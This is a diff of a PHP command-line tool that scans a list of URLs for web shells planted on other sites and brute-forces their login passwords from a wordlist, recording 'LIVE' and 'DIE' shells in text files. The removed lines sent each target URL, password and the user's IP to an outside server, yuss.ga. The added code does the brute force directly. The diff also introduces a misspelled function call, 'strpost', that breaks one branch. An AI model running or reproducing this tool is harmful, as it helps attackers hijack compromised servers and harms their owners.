@@ -33,100 +33,96 @@ function crotz($x)
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-    curl_setopt($ch, CURLOPT_URL, "https://yuss.ga/apiberingas.php");
+    curl_setopt($ch, CURLOPT_URL, $x);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, "url=" . $x);
-    $exec = curl_exec($ch);
-    $result = json_decode($exec);
-    $ex = explode(" ",$result->Type);
-    $msg = $result->Messages;
-    $status = $result->ResponseCode;
-    $type = $result->Type;
-    $type = explode("Shell with passname as ", $type);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+    curl_setopt($ch, CURLOPT_HEADER, 1);
+    $output = curl_exec($ch);
+    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 
-    if(($result->Status == "success") && $ex[0] == "Shell")
+    if($status == 200)
     {
-        echo "\nFounded a " . $ex[0] . " at ".$x." with Messages " . $msg . " and HTTP Code " . $status . "\nDo you want to login? [Y/n] [default = n (NO)] ";
-        $answer = trim(fgets(STDIN));
+        preg_match("|<input type=\"password\" name=\"(.*?)\"|", $output, $password);
+        preg_match("|File Manager|", $output, $fm);
+        preg_match("|<input type=\"file\" |", $output, $upload);
 
-        if(($answer == "y") || $answer == "Y")
+        if(!empty($password))
         {
-            echo "Type your pass : ";
-            $pass = trim(fgets(STDIN));
+            $password = $password[1];
+            echo "\nFounded a webshell at ".$x."\nDo you want to login? [Y/n] [default = n (NO)] ";
+            $answer = trim(fgets(STDIN));
 
-            if(strpos($pass, ".txt"))
+            if(($answer == "y") || $answer == "Y")
             {
-                $open = fopen("$pass", "r");
-                $size = filesize("$pass");
-                $read = fread($open, $size);
-                $passwd = explode("\n", $read);
+                unlink('cook.txt');
+                echo "Type your pass : ";
+                $pass = trim(fgets(STDIN));
 
-                foreach($passwd as $key)
+                if(strpos($pass, ".txt"))
                 {
-                    if(!empty($key))
-                    {
-                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-                        curl_setopt($ch, CURLOPT_URL, "https://yuss.ga/bruteberingas.php");
-                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-                        curl_setopt($ch, CURLOPT_POST, 1);
-                        curl_setopt($ch, CURLOPT_POSTFIELDS, "url=" . $x . "&pass=" . $key . "&ip=" . exec("curl -s ifconfig.me") . "&name=" . $type[1]);
-                        $exe = curl_exec($ch);
-                        $results = json_decode($exe);
+                    $open = fopen("$pass", "r");
+                    $size = filesize("$pass");
+                    $read = fread($open, $size);
+                    $passwd = explode("\n", $read);
 
-                        if($results->status == "success")
+                    foreach($passwd as $key)
+                    {
+                        if(!empty($key))
                         {
-                            $end = fopen("shell_result.txt", "a+");
-                            fwrite($end, "\n[LIVE] Shell at ".$x." password : ".$key);
-                            print "\n[".date('H:m:s')."] [LIVE] Shell at ".$x."\n is ok with ".$key."\n\n";
-                            fclose($end);
-                            break;
-                        } else if($results->status == "error")
-                        {
-                            $end = fopen("shell_die.txt", "a+");
-                            fwrite($end, "\n[DIE] Shell at " . $x);
-                            print "[".date('H:m:s')."] [DIE] Shell at ".$x." can't matching the password with ".$key."\n";
-                            fclose($end);
+                            curl_setopt($ch, CURLOPT_URL, $x);
+                            curl_setopt($ch, CURLOPT_HEADER, 0);
+                            curl_setopt($ch, CURLOPT_COOKIEJAR, 'cook.txt');
+                            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+                            curl_setopt($ch, CURLOPT_POST, true);
+                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                            curl_setopt($ch, CURLOPT_POSTFIELDS, "pass=".$key);
+                            $output = curl_exec($ch);
+                            preg_match("|<input type=\"password\" name=\"(.*?)\"|", $output, $pswd);
+
+                            if(!empty($pswd))
+                            {
+                                $end = fopen("shell_die.txt", "a+");
+                                fwrite($end, "\n[DIE] Shell at ".$x." password : ".$key);
+                                print "[".date('H:m:s')."] [DIE] Shell at ".$x." can't matching the password with ".$key."\n";
+                                fclose($end);
+                            } else if(empty($pswd))
+                            {
+                                $end = fopen("shell_result.txt", "a+");
+                                fwrite($end, "\n[LIVE] Shell at ".$x." password : ".$key);
+                                print "\n[".date('H:m:s')."] [LIVE] Shell at ".$x."\n is ok with ".$key."\n\n";
+                                fclose($end);
+                            }
                         }
                     }
-                }
-            }  else if(!strpos($pass, ".txt"))
-            {
-                if(!empty($pass))
+                } else if(!strpos($pass, ".txt"))
                 {
-                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-                    curl_setopt($ch, CURLOPT_URL, "https://yuss.ga/bruteberingas.php");
-                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-                    curl_setopt($ch, CURLOPT_POST, 1);
-                    curl_setopt($ch, CURLOPT_POSTFIELDS, "url=" . $x . "&pass=" . $pass . "&ip=" . exec("curl -s ifconfig.me") . "&name=" . $type[1]);
-                    $exe = curl_exec($ch);
-                    $results = json_decode($exe);
+                    curl_setopt($ch, CURLOPT_URL, $x);
+                    curl_setopt($ch, CURLOPT_HEADER, 0);
+                    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cook.txt');
+                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+                    curl_setopt($ch, CURLOPT_POST, true);
+                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                    curl_setopt($ch, CURLOPT_POSTFIELDS, "pass=".$pass);
+                    $output = curl_exec($ch);
+                    preg_match("|<input type=\"password\" name=\"(.*?)\"|", $output, $pswd);
 
-                    if($results->status == "success")
+                    if(!empty($pswd))
+                    {
+                        $end = fopen("shell_die.txt", "a+");
+                        fwrite($end, "\n[DIE] Shell at ".$x." password : ".$pass);
+                        print "\n[".date('H:m:s')."] [DIE] Shell at ".$x." can't matching the password with ".$pass."\n";
+                        fclose($end);
+                    } else if(empty($pswd))
                     {
                         $end = fopen("shell_result.txt", "a+");
                         fwrite($end, "\n[LIVE] Shell at ".$x." password : ".$pass);
                         print "\n[".date('H:m:s')."] [LIVE] Shell at ".$x."\n is ok with ".$pass."\n\n";
                         fclose($end);
-                    } else if($results->status == "error")
-                    {
-                        $end = fopen("shell_die.txt", "a+");
-                        fwrite($end, "\n[DIE] Shell at " . $x);
-                        print "[".date('H:m:s')."] [DIE] Shell at ".$x." can't matching the password with ".$pass."\n";
-                        fclose($end);
                     }
                 }
             }
         }
-    } else if(($result->Status == "success") && $ex[0] == "Uploader")
-    {
-        $end = fopen("shell_result.txt", "a+");
-        fwrite($end, "\n[LIVE] Uploader at ". $x ."\n");
-        print "\n[".date('H:m:s')."] [LIVE] Uploader at ".$x."\n\n";
-        fclose($end);
-    } else
+    } else if(!empty($status) && $status != 200)
     {
         echo "[DIE] Sorry, but the shell at ".$x." isn't found\n";
     }
@@ -141,11 +137,9 @@ if(strpos($list, ".txt"))
 
     foreach($url as $host)
     {
-            if(!empty($host) && $host != ''){
-                crotz($host);
-            }
+        crotz($host);
     }
-} else if(strpos($list, ".txt") && strpos($list, "|"))
+} else if(strpos($list, ".txt") && strpost($list, "|"))
 {
     $explode = explode("|", $list);
 
@@ -158,18 +152,8 @@ if(strpos($list, ".txt"))
 
         foreach($url as $host)
         {
-            if(!empty($host) && $host != ''){
                 crotz($host);
-            }
         }
-    }
-} else if(strpos($list, "|") && !strpos($list, ".txt"))
-{
-    $explode = explode("|", $list);
-
-    foreach($explode as $lists)
-    {
-        crotz($lists);
     }
 } else
 {
